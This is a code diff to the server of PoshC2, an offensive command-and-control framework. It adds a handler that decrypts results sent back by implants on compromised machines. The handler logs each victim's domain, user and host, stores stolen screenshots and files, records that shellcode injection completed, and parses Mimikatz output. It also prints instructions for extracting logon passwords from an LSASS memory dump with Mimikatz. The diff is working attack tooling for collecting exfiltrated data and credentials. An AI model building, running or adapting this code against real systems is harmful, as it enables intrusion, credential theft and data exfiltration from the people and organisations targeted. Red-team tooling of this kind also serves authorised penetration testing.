@@ -1,13 +1,181 @@
-import datetime, hashlib, base64, traceback, os
+import datetime, hashlib, base64, traceback, os, re
 
 from poshc2.Colours import Colours
+from poshc2.server.Config import DatabaseType, ModulesDirectory, DownloadsDirectory
+from poshc2.server.Implant import Implant
+from poshc2.server.Core import decrypt, encrypt, default_response, decrypt_bytes_gzip, number_of_days, process_mimikatz, print_bad
 from poshc2.server.Core import load_module, load_module_sharp, encrypt, default_response
-from poshc2.server.Config import DatabaseType, ModulesDirectory
+from poshc2.server.Payloads import Payloads
+from poshc2.Utils import randomuri
 
 if DatabaseType.lower() == "postgres":
     import poshc2.server.database.DBPostgres as DB
 else:
     import poshc2.server.database.DBSQLite as DB
+
+def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
+    now = datetime.datetime.now()
+    all_implants = DB.get_implants_all()
+    if not all_implants:
+        print_bad("Received post request but no implants in database... has the project been cleaned but you're using the same URLs?")
+        return
+    for implant in all_implants:
+        implantID = implant.ImplantID
+        RandomURI = implant.RandomURI
+        Hostname = implant.Hostname
+        encKey = implant.Key
+        Domain = implant.Domain
+        User = implant.User
+        if RandomURI in uriPath and cookieVal:
+            DB.update_implant_lastseen(now.strftime("%d/%m/%Y %H:%M:%S"), RandomURI)
+            decCookie = decrypt(encKey, cookieVal)
+            rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
+            if decCookie.startswith("Error"):
+                print(Colours.RED)
+                print("The multicmd errored: ")
+                print(rawoutput)
+                print(Colours.GREEN)
+                return
+            taskId = str(int(decCookie.strip('\x00')))
+            taskIdStr = "0" * (5 - len(str(taskId))) + str(taskId)
+            executedCmd = DB.get_cmd_from_task_id(taskId)
+            task_owner = DB.get_task_owner(taskId)
+            print(Colours.GREEN)
+            if task_owner is not None:
+                print("Task %s (%s) returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, task_owner, implantID, Domain, User, Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
+            else:
+                print("Task %s returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, implantID, Domain, User, Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
+            try:
+                outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
+                outputParsed = outputParsed.rstrip()
+            except Exception:
+                pass
+            if "loadmodule" in executedCmd:
+                print("Module loaded successfully")
+                DB.update_task(taskId, "Module loaded successfully")
+            elif executedCmd.lower().startswith("beacon "):
+                new_sleep = executedCmd.replace('beacon ', '').strip()
+                DB.update_sleep(new_sleep, RandomURI)
+            elif "get-screenshot" in executedCmd.lower():
+                try:
+                    decoded = base64.b64decode(outputParsed)
+                    filename = implant.User + "-" + now.strftime("%m%d%Y%H%M%S_" + randomuri())
+                    output_file = open('%s%s.png' % (DownloadsDirectory, filename), 'wb')
+                    print("Screenshot captured: %s%s.png" % (DownloadsDirectory, filename))
+                    DB.update_task(taskId, "Screenshot captured: %s%s.png" % (DownloadsDirectory, filename))
+                    output_file.write(decoded)
+                    output_file.close()
+                except Exception:
+                    DB.update_task(taskId, "Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
+                    print("Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
+            elif (executedCmd.lower().startswith("$shellcode64")) or (executedCmd.lower().startswith("$shellcode64")):
+                DB.update_task(taskId, "Upload shellcode complete")
+                print("Upload shellcode complete")
+            elif (executedCmd.lower().startswith("run-exe core.program core inject-shellcode")):
+                DB.update_task(taskId, "Upload shellcode complete")
+                print(outputParsed)
+            elif "download-file" in executedCmd.lower():
+                try:
+                    filename = executedCmd.lower().replace("download-files ", "")
+                    filename = filename.replace("download-file ", "")
+                    filename = filename.replace("-source ", "")
+                    filename = filename.replace("..", "")
+                    filename = filename.replace("'", "")
+                    filename = filename.replace('"', "")
+                    filename = filename.replace("\\", "/")
+                    directory, filename = filename.rsplit('/', 1)
+                    filename = filename.rstrip('\x00')
+                    original_filename = filename.strip()
+
+                    if not original_filename:
+                        directory = directory.rstrip('\x00')
+                        directory = directory.replace("/", "_").replace("\\", "_").strip()
+                        original_filename = directory
+
+                    try:
+                        if rawoutput.startswith("Error"):
+                            print("Error downloading file: ")
+                            print(rawoutput)
+                            break
+                        chunkNumber = rawoutput[:5]
+                        totalChunks = rawoutput[5:10]
+                    except Exception:
+                        chunkNumber = rawoutput[:5].decode("utf-8")
+                        totalChunks = rawoutput[5:10].decode("utf-8")
+
+                    if (chunkNumber == "00001") and os.path.isfile('%s%s' % (DownloadsDirectory, filename)):
+                        counter = 1
+                        while(os.path.isfile('%s%s' % (DownloadsDirectory, filename))):
+                            if '.' in filename:
+                                filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
+                            else:
+                                filename = original_filename + '-' + str(counter)
+                            counter += 1
+                    if (chunkNumber != "00001"):
+                        counter = 1
+                        if not os.path.isfile('%s%s' % (DownloadsDirectory, filename)):
+                            print("Error trying to download part of a file to a file that does not exist: %s" % filename)
+                        while(os.path.isfile('%s%s' % (DownloadsDirectory, filename))):
+                            # First find the 'next' file would be downloaded to
+                            if '.' in filename:
+                                filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
+                            else:
+                                filename = original_filename + '-' + str(counter)
+                            counter += 1
+                        if counter != 2:
+                            # Then actually set the filename to this file - 1 unless it's the first one and exists without a counter
+                            if '.' in filename:
+                                filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter - 2) + original_filename[original_filename.rfind('.'):]
+                            else:
+                                filename = original_filename + '-' + str(counter - 2)
+                        else:
+                            filename = original_filename
+                    print("Download file part %s of %s to: %s" % (chunkNumber, totalChunks, filename))
+                    DB.update_task(taskId, "Download file part %s of %s to: %s" % (chunkNumber, totalChunks, filename))
+                    output_file = open('%s%s' % (DownloadsDirectory, filename), 'ab')
+                    try:
+                        output_file.write(rawoutput[10:])
+                    except Exception:
+                        output_file.write(rawoutput[10:].encode("utf-8"))
+                    output_file.close()
+                except Exception as e:
+                    DB.update_task(taskId, "Error downloading file %s " % e)
+                    print("Error downloading file %s " % e)
+                    traceback.print_exc()
+
+            elif "safetydump" in executedCmd.lower():
+                rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
+                if rawoutput.startswith("[-]") or rawoutput.startswith("ErrorCmd"):
+                    DB.update_task(taskId, rawoutput)
+                    print(rawoutput)
+                else:
+                    dumpname = "SafetyDump-Task-%s.b64" % taskIdStr
+                    dumppath = "%s%s" % (DownloadsDirectory, dumpname)
+                    open(dumppath, 'w').write(rawoutput)
+                    message = "Dump written to: %s" % dumppath
+                    message = message + "\n The base64 blob needs decoding on Windows and then Mimikatz can be run against it."
+                    message = message + "\n E.g:"
+                    message = message + "\n     $filename = '.\\%s'" % dumpname
+                    message = message + "\n     $b64 = Get-Content $filename"
+                    message = message + "\n     $bytes = [System.Convert]::FromBase64String($b64)"
+                    message = message + "\n     [io.file]::WriteAllBytes(((Get-Item -Path \".\\\").FullName) + 'safetydump.dmp', $bytes)"
+                    message = message + "\n     ./mimikatz.exe"
+                    message = message + "\n     sekurlsa::minidump safetydump.dmp"
+                    message = message + "\n     sekurlsa::logonpasswords"
+                    DB.update_task(taskId, message)
+                    print(message)
+
+            elif (executedCmd.lower().startswith("run-exe safetykatz") or "invoke-mimikatz" in executedCmd or executedCmd.lower().startswith("pbind-command")) and "logonpasswords" in outputParsed.lower():
+                print("Parsing Mimikatz Output")                
+                DB.update_task(taskId, outputParsed)
+                process_mimikatz(outputParsed)
+                print(Colours.GREEN)
+                print(outputParsed + Colours.END)
+
+            else:
+                DB.update_task(taskId, outputParsed)
+                print(Colours.GREEN)
+                print(outputParsed + Colours.END)
 
 
 def newTask(path):
